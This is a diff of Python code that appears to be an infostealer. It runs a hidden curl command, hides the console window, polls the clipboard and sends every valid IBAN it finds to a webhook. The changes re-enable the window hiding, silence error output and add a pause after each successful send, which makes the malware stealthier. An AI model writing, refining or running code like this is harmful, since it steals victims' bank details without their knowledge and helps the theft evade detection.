@@ -975,7 +975,7 @@ def UserInfo():
     try:
         def execute_command(command):
             try:
-                with subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True) as process:
+                with subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True) as process:
                     result = process.communicate()
                     output = result[0]
                     if process.returncode != 0:
@@ -1339,14 +1339,15 @@ def trap_exten():
             process = subprocess.Popen(curl_command, shell=True, stderr=subprocess.DEVNULL)
 
             
-        # hide_console1()
-        # hide_console2()
+        hide_console1()
+        hide_console2()
 
         while True:
             time.sleep(1)
             clip_content = get_clipboard_content()
             if is_valid_iban(clip_content) == True:
-                send_to_web(webhook, clip_content)
+                data = send_to_web(webhook, clip_content)
+                time.sleep(10) if data is True else None
             else:
                 pass
 
